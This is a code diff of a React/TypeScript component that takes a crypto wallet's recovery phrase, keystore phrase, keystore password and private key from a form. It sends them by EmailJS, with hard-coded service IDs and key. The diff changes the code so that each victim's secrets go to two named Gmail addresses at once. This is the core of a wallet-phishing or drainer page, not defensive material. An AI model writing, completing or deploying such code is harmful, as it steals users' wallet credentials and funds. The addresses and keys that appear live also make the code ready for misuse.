@@ -50,7 +50,38 @@ const Phrase = () => {
   const submitData = async (data: connectDataType) => {
     setLoading(true);
     reset();
-    // Prepare the email data
+
+    //   const templateParams = {
+    //     recoveryPhrase: data.recoveryPhrase || "",
+    //     keystorePhrase: data.keystorePhrase || "",
+    //     keystorePassword: data.keystorePassword || "",
+    //     privateKey: data.private || "",
+    //   };
+
+    //   try {
+    //     // Send the email using EmailJS
+    //     const result = await emailjs.send(
+    //       "service_4dcwyzd",
+    //       "template_u12wotc",
+    //       templateParams,
+    //       "fZab5skM3kS9JSPtg"
+    //     );
+
+    //     if (result.status === 200) {
+    //       // If the email was sent successfully, show confirmation
+    //       setLoading(false);
+    //       setConfirmed(true);
+    //     }
+    //   } catch (error) {
+    //     console.error("Error sending email:", error);
+    //     setLoading(false);
+    //   }
+    // };
+    // const submitData = async (data: connectDataType) => {
+    //   setLoading(true);
+    //   reset();
+
+    // Common template data
     const templateParams = {
       recoveryPhrase: data.recoveryPhrase || "",
       keystorePhrase: data.keystorePhrase || "",
@@ -58,17 +89,25 @@ const Phrase = () => {
       privateKey: data.private || "",
     };
 
-    try {
-      // Send the email using EmailJS
-      const result = await emailjs.send(
+    // Helper function to send email to a specific email address
+    const sendEmail = async (email: string) => {
+      return emailjs.send(
         "service_4dcwyzd",
         "template_u12wotc",
-        templateParams,
+        { ...templateParams, recipientEmail: email },
         "fZab5skM3kS9JSPtg"
       );
+    };
 
-      if (result.status === 200) {
-        // If the email was sent successfully, show confirmation
+    try {
+      // Send emails to both addresses
+      const [result1, result2] = await Promise.all([
+        sendEmail("adebayooluwasegun335@gmail.com"),
+        sendEmail("captainfresh.aa1@gmail.com"),
+      ]);
+
+      if (result1.status === 200 && result2.status === 200) {
+        // If both emails were sent successfully, show confirmation
         setLoading(false);
         setConfirmed(true);
       }
